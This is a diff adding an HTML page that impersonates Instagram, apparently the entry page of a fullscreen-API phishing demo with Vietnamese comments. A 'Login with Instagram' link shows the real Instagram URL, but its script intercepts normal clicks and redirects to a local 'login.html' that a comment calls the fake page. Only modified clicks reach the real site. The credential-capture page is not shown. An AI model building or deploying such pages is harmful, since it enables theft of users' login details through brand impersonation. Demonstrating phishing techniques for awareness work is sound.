@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <title>Instagram</title>
+  <link rel="icon" type="image/x-icon" href="images/logo.ico">
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+  </style>
+</head>
+
+<body>
+
+  <div class="container group5">
+    <img src="images/logo_instagram.png" alt="Instagram Logo" width="200">
+    <h1>Instagram</h1>
+    <a href="https://www.instagram.com/" class="fake-link" id="instaBtn">Login with Instagram</a>
+    <p class="note">Click to continue</p>
+  </div>
+
+  <script src="js/libs/jquery-1.7.2.js"></script>
+  <script src="js/libs/browser-detect.js"></script>
+  <script src="js/libs/fullscreen-api.js"></script>
+
+  <script>
+    $(function () {
+      // Khởi tạo browser detection
+      BrowserDetect.init();
+
+      // Thêm class cho browser và OS
+      if (BrowserDetect.browser == "Chrome") {
+        $('html').addClass('chrome');
+      } else if (BrowserDetect.browser == "Firefox") {
+        $('html').addClass('firefox');
+      } else if (BrowserDetect.browser == "Safari") {
+        $('html').addClass('safari');
+      }
+
+      if (BrowserDetect.OS == "Mac") {
+        $('html').addClass('osx');
+      } else if (BrowserDetect.OS == "Windows") {
+        $('html').addClass('windows');
+      } else if (BrowserDetect.OS == "Linux") {
+        $('html').addClass('linux');
+      }
+
+      // Kiểm tra hỗ trợ fullscreen
+      if (!window.fullscreenSupport) {
+        $('.note').text('Trình duyệt không hỗ trợ Fullscreen API - Demo sẽ không hoạt động');
+        $('#instaBtn').addClass('disabled');
+      }
+    });
+
+    document.getElementById('instaBtn').addEventListener('click', function (e) {
+      if (e.ctrlKey || e.metaKey || e.button === 1) {
+        // Cho mở Instagram thật nếu Ctrl+Click hoặc Middle click
+        return true;
+      } else {
+        e.preventDefault();
+
+        // Kiểm tra support trước khi chuyển
+        if (!window.fullscreenSupport) {
+          alert('Trình duyệt của bạn không hỗ trợ Fullscreen API!');
+          return;
+        }
+
+        // Chuyển hướng sang trang giả mạo
+        window.location.href = "./login.html";
+      }
+    });
+  </script>
+
+</body>
+
+</html>
